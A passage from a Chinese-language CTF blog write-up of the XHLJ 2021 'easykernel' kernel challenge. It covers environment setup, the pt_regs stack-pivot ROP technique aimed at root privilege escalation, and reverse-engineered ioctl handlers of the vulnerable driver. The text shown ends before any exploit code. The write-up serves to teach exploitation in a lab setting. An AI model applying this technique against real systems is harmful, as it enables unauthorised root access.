@@ -1,0 +1,770 @@
+
+  <!DOCTYPE html>
+  <html lang="en"  >
+  <head>
+  <meta charset="utf-8">
+  
+
+  
+
+  
+
+  <script>window.REIMU_CONFIG = {};window.REIMU_CONFIG.icon_font = '4552607_bq08450reo';window.REIMU_CONFIG.clipboard_tips = {"success":"copy success(*^▽^*)","fail":"copy failed (ﾟ⊿ﾟ)ﾂ","copyright":{"enable":false,"count":50,"content":"Naup"}};window.REIMU_CONFIG.code_block = {"expand":true};</script>
+  
+  <title>
+    XHLJ 2021-easykernel - writeup |
+    
+    堇姬 Naup&#39;s Blog
+  </title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+  <link rel="preconnect" href="https://fonts.gstatic.com/" crossorigin><link rel="preload" as="style" href="https://fonts.googleapis.com/css?family=Mulish:400,400italic,700,700italic%7CNoto%20Serif%20SC:400,400italic,700,700italic&display=swap"><link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Mulish:400,400italic,700,700italic%7CNoto%20Serif%20SC:400,400italic,700,700italic&display=swap" media="print" onload="this.media&#x3D;&#39;all&#39;">
+  
+    <link rel="preload" href="//at.alicdn.com/t/c/font_4552607_bq08450reo.woff2" as="font" type="font/woff2" crossorigin="anonymous">
+  
+  
+    
+<link rel="stylesheet" href="/css/loader.css">
+
+  
+  
+    <meta name="description" content="XHLJ 2021-easykernel - writeup Author : 堇姬 Naup  analyze一樣的題目給了三個文件 12345naup96321@naup96321-virtual-machine:~&#x2F;Desktop&#x2F;ekernel$ tree.├── bzImage├── rootfs.img.gz└── start.sh  先解包 file system 123mkdir">
+<meta property="og:type" content="article">
+<meta property="og:title" content="XHLJ 2021-easykernel - writeup">
+<meta property="og:url" content="http://example.com/2025/05/14/XHLJ-2021-easykernel-writeup/index.html">
+<meta property="og:site_name" content="堇姬 Naup&#39;s Blog">
+<meta property="og:description" content="XHLJ 2021-easykernel - writeup Author : 堇姬 Naup  analyze一樣的題目給了三個文件 12345naup96321@naup96321-virtual-machine:~&#x2F;Desktop&#x2F;ekernel$ tree.├── bzImage├── rootfs.img.gz└── start.sh  先解包 file system 123mkdir">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://example.com/2025/05/14/XHLJ-2021-easykernel-writeup/a.png">
+<meta property="og:image" content="http://example.com/2025/05/14/XHLJ-2021-easykernel-writeup/b.png">
+<meta property="og:image" content="http://example.com/2025/05/14/XHLJ-2021-easykernel-writeup/c.png">
+<meta property="article:published_time" content="2025-05-14T13:27:37.000Z">
+<meta property="article:modified_time" content="2025-05-14T13:32:36.599Z">
+<meta property="article:author" content="Naup堇姬">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/2025/05/14/XHLJ-2021-easykernel-writeup/a.png">
+  
+  
+    <link rel="alternate" href="/atom.xml" title="堇姬 Naup's Blog" type="application/atom+xml">
+  
+  
+    <link rel="shortcut icon" href="/images/fav.ico">
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  <link rel="preload" href="https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+  
+  
+  
+  
+    
+<script src="https://npm.webcache.cn/pace-js@1.2.4/pace.min.js" integrity="sha384-k6YtvFUEIuEFBdrLKJ3YAUbBki333tj1CSUisai5Cswsg9wcLNaPzsTHDswp4Az8" crossorigin="anonymous"></script>
+
+  
+  
+    
+<link rel="stylesheet" href="https://npm.webcache.cn/@reimujs/aos@0.1.0/dist/aos.css">
+
+  
+  
+<!-- hexo injector head_end start -->
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.12.0/dist/katex.min.css">
+
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/hexo-math@4.0.0/dist/style.css">
+<!-- hexo injector head_end end --><meta name="generator" content="Hexo 7.1.1"></head>
+
+  <body>
+    
+  <div id='loader'>
+    <div class="loading-left-bg loading-bg"></div>
+    <div class="loading-right-bg loading-bg"></div>
+    <div class="spinner-box">
+      <div class="loading-taichi">
+        
+          <svg width="150" height="150" viewBox="0 0 1024 1024" class="icon" version="1.1" xmlns="https://www.w3.org/2000/svg" shape-rendering="geometricPrecision">
+            <path d="M303.5 432A80 80 0 0 1 291.5 592A80 80 0 0 1 303.5 432z" fill="var(--red-1, #ff5252)" />
+            <path d="M512 65A447 447 0 0 1 512 959L512 929A417 417 0 0 0 512 95A417 417 0 0 0 512 929L512 959A447 447 0 0 1 512 65z 
+           M512 95A417 417 0 0 1 929 512A208.5 208.5 0 0 1 720.5 720.5L720.5 592A80 80 0 0 0 720.5 432A80 80 0 0 0 720.5 592L720.5 720.5A208.5 208.5 0 0 1 512 512A208.5 208.5 0 0 0 303.5 303.5A208.5 208.5 0 0 0 95 512A417 417 0 0 1 512 95z" fill="var(--red-1, #ff5252)" />
+          </svg>
+        
+      </div>
+      <div class="loading-word">Naup...</div>
+    </div>
+  </div>
+  </div>
+  <script>
+    var time = null;
+    var startLoading = () => {
+      time = Date.now();
+      document.getElementById('loader').classList.remove("loading");
+    }
+    var endLoading = () => {
+      if (!time) {
+        document.body.style.overflow = 'auto';
+        document.getElementById('loader').classList.add("loading");
+      } else {
+        if (Date.now() - time > 500) {
+          time = null;
+          document.body.style.overflow = 'auto';
+          document.getElementById('loader').classList.add("loading");
+        } else {
+          setTimeout(endLoading, 500 - (Date.now() - time));
+          time = null;
+        }
+      }
+    }
+    window.addEventListener('DOMContentLoaded', endLoading);
+    document.getElementById('loader').addEventListener('click', endLoading);
+  </script>
+
+<div id="copy-tooltip" style="pointer-events: none; opacity: 0; transition: all 0.2s ease; position: fixed;top: 50%;left: 50%;z-index: 999;transform: translate(-50%, -50%);color: white;background: rgba(0, 0, 0, 0.5);padding: 10px 15px;border-radius: 10px;">
+</div>
+
+
+    <div id="container">
+      <div id="wrap">
+        <div id="header-nav">
+  <nav id="main-nav">
+    
+      
+        <span class="main-nav-link-wrap">
+          <div class="main-nav-icon icon rotate">
+            &#xe62b;
+          </div>
+          <a class="main-nav-link" href="/">Home</a>
+        </span>
+      
+        <span class="main-nav-link-wrap">
+          <div class="main-nav-icon icon rotate">
+            &#xe62b;
+          </div>
+          <a class="main-nav-link" href="/archives">Archives</a>
+        </span>
+      
+        <span class="main-nav-link-wrap">
+          <div class="main-nav-icon icon rotate">
+            &#xe62b;
+          </div>
+          <a class="main-nav-link" href="/about">About</a>
+        </span>
+      
+    
+    <a id="main-nav-toggle" class="nav-icon"></a>
+  </nav>
+  <nav id="sub-nav">
+    
+      <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed" target="_blank"></a>
+    
+    
+    
+  </nav>
+</div>
+<header id="header">
+  
+    <picture></picture>
+    <img fetchpriority="high" src="/images/posts_cover/LinuxKernelPwn/linuxkernel.png" alt="XHLJ 2021-easykernel - writeup">
+  
+  <div id="header-outer">
+    <div id="header-title">
+      
+        
+        
+          <a href="/" id="logo">
+            <h1 data-aos="slide-up">XHLJ 2021-easykernel - writeup</h1>
+          </a>
+        
+      
+      
+        
+        <h2 id="subtitle-wrap" data-aos="slide-down">
+          
+        </h2>
+      
+    </div>
+  </div>
+</header>
+
+        <div id="content"  class="sidebar-right" >
+          <aside id="sidebar">
+  
+  
+  <div class="sidebar-wrapper wrap-sticky">
+    <div class="sidebar-wrap" data-aos="fade-up">
+      
+        <div class="sidebar-toc-sidebar"><div class="sidebar-toc">
+  <h3 class="toc-title">Contents</h3>
+  <div class="sidebar-toc-wrapper toc-div-class" >
+      
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#XHLJ-2021-easykernel-writeup"><span class="toc-number">1.</span> <span class="toc-text">XHLJ 2021-easykernel - writeup</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#analyze"><span class="toc-number">1.1.</span> <span class="toc-text">analyze</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#syscall-and-pt-regs"><span class="toc-number">1.2.</span> <span class="toc-text">syscall and pt_regs</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#cool-commit-protect-pt-regs"><span class="toc-number">1.3.</span> <span class="toc-text">cool commit protect pt_regs</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#reverse-test-ko"><span class="toc-number">1.4.</span> <span class="toc-text">reverse test.ko</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#show-ioctlcode-0x40"><span class="toc-number">1.4.1.</span> <span class="toc-text">show (ioctlcode &#x3D;&#x3D; 0x40)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#edit-ioctlcode-0x50"><span class="toc-number">1.4.2.</span> <span class="toc-text">edit (ioctlcode &#x3D;&#x3D; 0x50)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#alloc-ioctlcode-0x20"><span class="toc-number">1.4.3.</span> <span class="toc-text">alloc (ioctlcode &#x3D;&#x3D; 0x20)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#free-ioctlcode-0x30"><span class="toc-number">1.4.4.</span> <span class="toc-text">free (ioctlcode &#x3D;&#x3D; 0x30)</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%85%B3%E6%9C%AC%E6%9E%B6%E6%A7%8B"><span class="toc-number">1.5.</span> <span class="toc-text">腳本架構</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%A9%E7%94%A8"><span class="toc-number">1.6.</span> <span class="toc-text">利用</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#exploit"><span class="toc-number">1.7.</span> <span class="toc-text">exploit</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#demo"><span class="toc-number">1.8.</span> <span class="toc-text">demo</span></a></li></ol></li></ol>
+      
+  </div>
+</div>
+</div>
+        <div class="sidebar-common-sidebar hidden"><div class="sidebar-author">
+  <img data-src="/avatar/avatar.webp" data-sizes="auto" alt="Naup堇姬" class="lazyload">
+  <div class="sidebar-author-name">Naup堇姬</div>
+  <div class="sidebar-description"></div>
+</div>
+<div class="sidebar-state">
+  <div class="sidebar-state-article">
+    <div>Posts</div>
+    <div class="sidebar-state-number">68</div>
+  </div>
+  <div class="sidebar-state-category">
+    <div>Categories</div>
+    <div class="sidebar-state-number">0</div>
+  </div>
+  <div class="sidebar-state-tag">
+    <div>Tags</div>
+    <div class="sidebar-state-number">21</div>
+  </div>
+</div>
+<div class="sidebar-social">
+  
+    <div class="icon-email sidebar-social-icon">
+      <a href=naup96721@gmail.com itemprop="url" target="_blank" aria-label="email" rel="noopener external nofollow noreferrer"></a>
+    </div>
+  
+    <div class="icon-github sidebar-social-icon">
+      <a href=https://github.com/Naupjjin itemprop="url" target="_blank" aria-label="github" rel="noopener external nofollow noreferrer"></a>
+    </div>
+  
+</div>
+<div class="sidebar-menu">
+  
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/" aria-label="Home"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          &#xe62b;
+        </div>
+        <div class="sidebar-menu-link">Home</div>
+      </div>
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/archives" aria-label="Archives"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          &#xe62b;
+        </div>
+        <div class="sidebar-menu-link">Archives</div>
+      </div>
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/about" aria-label="About"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          &#xe62b;
+        </div>
+        <div class="sidebar-menu-link">About</div>
+      </div>
+    
+  
+</div>
+</div>
+      
+      
+        <div class="sidebar-btn-wrapper" style="position:static">
+          <div class="sidebar-toc-btn current"></div>
+          <div class="sidebar-common-btn"></div>
+        </div>
+      
+    </div>
+  </div>
+
+  <div class="sidebar-widget">
+  
+  </div>
+</aside>
+
+          <section id="main"><article id="post-XHLJ-2021-easykernel-writeup" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-inner" data-aos="fade-up">
+    <div class="article-meta">
+      <div class="article-date">
+  <a href="/2025/05/14/XHLJ-2021-easykernel-writeup/" class="article-date-link" data-aos="zoom-in">
+    <time datetime="2025-05-14T13:27:37.000Z" itemprop="datePublished">2025-05-14</time>
+    <time style="display: none;" id="post-update-time">2025-05-14</time>
+  </a>
+</div>
+
+      
+
+    </div>
+    <div class="hr-line"></div>
+    
+
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+      
+        <h1 id="XHLJ-2021-easykernel-writeup"><a href="#XHLJ-2021-easykernel-writeup" class="headerlink" title="XHLJ 2021-easykernel - writeup"></a>XHLJ 2021-easykernel - writeup</h1><blockquote>
+<p>Author : 堇姬 Naup</p>
+</blockquote>
+<h2 id="analyze"><a href="#analyze" class="headerlink" title="analyze"></a>analyze</h2><p>一樣的題目給了三個文件</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">naup96321@naup96321-virtual-machine:~/Desktop/ekernel$ tree</span><br><span class="line">.</span><br><span class="line">├── bzImage</span><br><span class="line">├── rootfs.img.gz</span><br><span class="line">└── start.sh</span><br></pre></td></tr></table></figure>
+
+<p>先解包 file system</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">mkdir</span> -p sysfile</span><br><span class="line">gunzip rootfs.img.gz</span><br><span class="line">cpio -idmv -D sysfile &lt; rootfs.img</span><br></pre></td></tr></table></figure>
+
+<p>順便寫 pack.sh 打包</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find . | cpio -o --format=newc &gt; ../rootfs.img.gz</span><br></pre></td></tr></table></figure>
+
+<p>有開 KPTI、KASLR、SMEP</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">/ # dmesg | grep -i &quot;Page Table&quot;</span><br><span class="line">[    0.000000] Kernel/User page tables isolation: enabled</span><br><span class="line"></span><br><span class="line">/ # grep -o &#x27;smap\|smep&#x27; /proc/cpuinfo | sort -u</span><br><span class="line">smep</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/sh</span></span><br><span class="line"></span><br><span class="line">qemu-system-x86_64  \</span><br><span class="line">	-m 128M \</span><br><span class="line">	-cpu kvm64,+smep \</span><br><span class="line">	-kernel ./bzImage \</span><br><span class="line">	-initrd rootfs.img.gz \</span><br><span class="line">	-nographic \</span><br><span class="line">	-s \</span><br><span class="line">	-append <span class="string">&quot;console=ttyS0 kaslr noapic&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p>根據 init 可以知道，他會 load test.ko 這個 kernel driver<br>目標一樣是提權到 root</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/sh</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">mkdir</span> /tmp</span><br><span class="line">mount -t proc none /proc</span><br><span class="line">mount -t sysfs none /sys</span><br><span class="line">mount -t debugfs none /sys/kernel/debug</span><br><span class="line">mount -t devtmpfs devtmpfs /dev</span><br><span class="line">mount -t tmpfs none /tmp</span><br><span class="line">mdev -s</span><br><span class="line"><span class="built_in">echo</span> -e <span class="string">&quot;Boot took <span class="subst">$(cut -d&#x27; &#x27; -f1 /proc/uptime)</span> seconds&quot;</span></span><br><span class="line"></span><br><span class="line">insmod /test.ko</span><br><span class="line"><span class="built_in">chmod</span> 666 /dev/kerpwn</span><br><span class="line"><span class="built_in">chmod</span> 740 /flag</span><br><span class="line"><span class="built_in">echo</span> 1 &gt; /proc/sys/kernel/kptr_restrict</span><br><span class="line"><span class="built_in">echo</span> 1 &gt; /proc/sys/kernel/dmesg_restrict</span><br><span class="line"><span class="built_in">chmod</span> 400 /proc/kallsyms</span><br><span class="line"></span><br><span class="line">poweroff -d 120 -f &amp;</span><br><span class="line">setsid /bin/cttyhack setuidgid 0 /bin/sh</span><br><span class="line"><span class="comment">#setsid /bin/cttyhack setuidgid 1000 /bin/sh</span></span><br><span class="line"></span><br><span class="line">umount /proc</span><br><span class="line">umount /tmp</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">poweroff -d 0  -f</span><br></pre></td></tr></table></figure>
+
+<h2 id="syscall-and-pt-regs"><a href="#syscall-and-pt-regs" class="headerlink" title="syscall and pt_regs"></a>syscall and pt_regs</h2><p>syscall 的本質是一種從 user space 切換到 kernel space 的「受控」方法，它允許使用者程式請求作業系統執行特權操作，例如開檔案、讀寫記憶體、建立程序、分配資源等</p>
+<p>通過 gate，進到 kernel space 他會去調用 <code>entry_SYSCALL_64</code><br>把 register 的值一個一個壓到 kernel stack 上<br><a target="_blank" rel="noopener" href="https://elixir.bootlin.com/linux/v5.8/source/arch/x86/entry/entry_64.S#L94">https://elixir.bootlin.com/linux/v5.8/source/arch/x86/entry/entry_64.S#L94</a></p>
+<p>這東西就會組成一個結構，叫做 pt_regs 實質上位於 kernel stack 最底部<br>順帶一提，pt_regs 是在高位記憶體的，因為 stack 由高往低長</p>
+<p><a target="_blank" rel="noopener" href="https://elixir.bootlin.com/linux/v5.8/source/arch/x86/include/uapi/asm/ptrace.h#L44">https://elixir.bootlin.com/linux/v5.8/source/arch/x86/include/uapi/asm/ptrace.h#L44</a></p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pt_regs</span> &#123;</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * C ABI says these regs are callee-preserved. They aren&#x27;t saved on kernel entry</span></span><br><span class="line"><span class="comment"> * unless syscall needs a complete, fully filled &quot;struct pt_regs&quot;.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">	<span class="type">unsigned</span> <span class="type">long</span> r15;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">long</span> r14;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">long</span> r13;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">long</span> r12;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">long</span> rbp;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">long</span> rbx;</span><br><span class="line"><span class="comment">/* These regs are callee-clobbered. Always saved on kernel entry. */</span></span><br><span class="line">	<span class="type">unsigned</span> <span class="type">long</span> r11;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">long</span> r10;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">long</span> r9;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">long</span> r8;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">long</span> rax;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">long</span> rcx;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">long</span> rdx;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">long</span> rsi;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">long</span> rdi;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * On syscall entry, this is syscall#. On CPU exception, this is error code.</span></span><br><span class="line"><span class="comment"> * On hw interrupt, it&#x27;s IRQ number:</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">	<span class="type">unsigned</span> <span class="type">long</span> orig_rax;</span><br><span class="line"><span class="comment">/* Return frame for iretq */</span></span><br><span class="line">	<span class="type">unsigned</span> <span class="type">long</span> rip;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">long</span> cs;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">long</span> eflags;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">long</span> rsp;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">long</span> ss;</span><br><span class="line"><span class="comment">/* top of stack page */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
+
+<p>總之這是一個連續 8 byte 的記憶體區段<br>我們在進入 syscall 前實質上是可以控制這段的<br>只要控制 register 值後 syscall，就可以預先壓入想要寫的值</p>
+<p>通過這個結構體 ROP 核心思想就是預先在 userspace 壓上想跑的 ROP<br>之後控制 RIP 後，將 RIP 跳到 <code>add rsp, val</code> 來搬移 kernel stack 到這塊結構上</p>
+<h2 id="cool-commit-protect-pt-regs"><a href="#cool-commit-protect-pt-regs" class="headerlink" title="cool commit protect pt_regs"></a>cool commit protect pt_regs</h2><p><a target="_blank" rel="noopener" href="https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=eea2647e74cd7bd5d04861ce55fa502de165de14">https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=eea2647e74cd7bd5d04861ce55fa502de165de14</a></p>
+<h2 id="reverse-test-ko"><a href="#reverse-test-ko" class="headerlink" title="reverse test.ko"></a>reverse test.ko</h2><p>根據不同的 ioctl 分成四個功能<br>這邊看組語比較清楚</p>
+<h3 id="show-ioctlcode-0x40"><a href="#show-ioctlcode-0x40" class="headerlink" title="show (ioctlcode &#x3D;&#x3D; 0x40)"></a>show (ioctlcode &#x3D;&#x3D; 0x40)</h3><p>ioctl 前三個參數是 fd (rdi), ioctlcode (rsi), args(rdx)<br>他會比較 ioctlcode 是否等於 0x40</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">push    rbp</span><br><span class="line">mov     r8, rdx</span><br><span class="line">mov     rbp, rsp</span><br><span class="line">push    r14</span><br><span class="line">push    r13</span><br><span class="line">push    r12</span><br><span class="line">push    rbx</span><br><span class="line">sub     rsp, 20h</span><br><span class="line">mov     rax, gs:28h</span><br><span class="line">mov     [rbp-28h], rax</span><br><span class="line">xor     eax, eax</span><br><span class="line">cmp     esi, 40h ; &#x27;@&#x27;</span><br><span class="line">jz      loc_2C9</span><br></pre></td></tr></table></figure>
+
+<p>如果是就跳至這裡，r8 是 rdx (args)， edx 設為 0x18 (從 userspace copy 的 size)，rdi 是 kernel stack 上的值</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">loc_2C9:</span><br><span class="line">mov     edx, 18h</span><br><span class="line">mov     rsi, r8</span><br><span class="line">lea     rdi, [rbp-40h]</span><br><span class="line">call    _copy_from_user ; PIC mode</span><br><span class="line">test    rax, rax</span><br><span class="line">jnz     short loc_2EF</span><br></pre></td></tr></table></figure>
+
+<p>如果複製成功就跳至這裡 call show<br>並傳入 <code>rbp - 0x40</code></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">lea     rdi, [rbp-40h]</span><br><span class="line">call    show</span><br><span class="line">xor     eax, eax</span><br><span class="line">jmp     loc_198</span><br></pre></td></tr></table></figure>
+
+<p>這裡的 rbp - 0x40 是 index</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">show</span><span class="params">(_QWORD *a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">const</span> <span class="type">void</span> *v1; <span class="comment">// rsi</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v2; <span class="comment">// r13</span></span><br><span class="line">  __int64 v3; <span class="comment">// r14</span></span><br><span class="line">  _BYTE v5[<span class="number">256</span>]; <span class="comment">// [rsp-128h] [rbp-128h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v6; <span class="comment">// [rsp-28h] [rbp-28h]</span></span><br><span class="line"></span><br><span class="line">  _fentry__();</span><br><span class="line">  v6 = __readgsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">memset</span>(v5, <span class="number">0</span>, <span class="keyword">sizeof</span>(v5));</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="type">unsigned</span> <span class="type">int</span>)*a1 &gt; <span class="number">0x20</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0xFFFFFFFF</span>LL;</span><br><span class="line">  v1 = (<span class="type">const</span> <span class="type">void</span> *)addrList[(<span class="type">unsigned</span> <span class="type">int</span>)*a1];</span><br><span class="line">  <span class="keyword">if</span> ( !v1 )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0xFFFFFFFF</span>LL;</span><br><span class="line">  v2 = a1[<span class="number">1</span>];</span><br><span class="line">  v3 = a1[<span class="number">2</span>];</span><br><span class="line">  qmemcpy(v5, v1, <span class="keyword">sizeof</span>(v5));</span><br><span class="line">  <span class="keyword">if</span> ( v2 &gt; <span class="number">0x100</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    _warn_printk(<span class="string">&quot;Buffer overflow detected (%d &lt; %lu)!\n&quot;</span>, <span class="number">256</span>, v2);</span><br><span class="line">    BUG();</span><br><span class="line">  &#125;</span><br><span class="line">  _check_object_size(v5, v2, <span class="number">1LL</span>);</span><br><span class="line">  <span class="keyword">return</span> copy_to_user(v3, v5, v2) != <span class="number">0</span> ? <span class="number">0xFFFFFFEA</span> : <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>args 根據傳入長度可以先推得，剩下兩個沒使用到<br>大概率是 size 跟 *buf</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">args</span>&#123;</span></span><br><span class="line">	<span class="type">uint64_t</span> index;</span><br><span class="line">	...</span><br><span class="line">	...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="edit-ioctlcode-0x50"><a href="#edit-ioctlcode-0x50" class="headerlink" title="edit (ioctlcode &#x3D;&#x3D; 0x50)"></a>edit (ioctlcode &#x3D;&#x3D; 0x50)</h3><p>若大於 0x40 跳至左邊</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">ja      short loc_1B8</span><br><span class="line"></span><br><span class="line">loc_1B8:</span><br><span class="line">cmp     esi, 50h ; &#x27;P&#x27;</span><br><span class="line">jnz     short loc_196</span><br></pre></td></tr></table></figure>
+
+<p>如果等於 0x50 會進到這個分支，如果不是直接 return<br>這個分支 edx 是 0x18 (args 長度)<br>rsi 是 args<br>rdi 存從 userspace copy 的 args</p>
